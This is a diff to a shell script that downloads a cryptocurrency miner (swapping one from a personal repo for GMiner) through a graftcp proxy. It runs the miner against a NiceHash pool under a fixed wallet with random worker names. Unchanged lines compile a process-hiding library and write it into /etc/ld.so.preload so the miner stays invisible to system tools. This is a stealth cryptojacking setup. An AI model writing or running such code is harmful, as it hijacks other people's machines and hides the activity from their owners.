@@ -36,8 +36,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash 
-chmod +x bezzHash 
+./graftcp/graftcp wget wget https://github.com/develsoftware/GMinerRelease/releases/download/2.69/gminer_2_69_linux64.tar.xz
+tar -xhf gminer_2_69_linux64.tar.xz
  
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
 unzip magicBezzHash.zip 
@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./graftcp/graftcp ./bezzHash --url=ssl://3CX7thXv58hbbtufREN5TDKa2ndXUbxG3N.aswes@blake2s.auto.nicehash.com:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp sudo ./miner --algo blake2s --server stratum+tcp://blake2s.auto.nicehash.com:9200 --user 3Hf18TdQBsprGvV86bbTJEdLTnj4Lf5Xwy.$(echo $(shuf -i 1000-9999999999 -n 1))
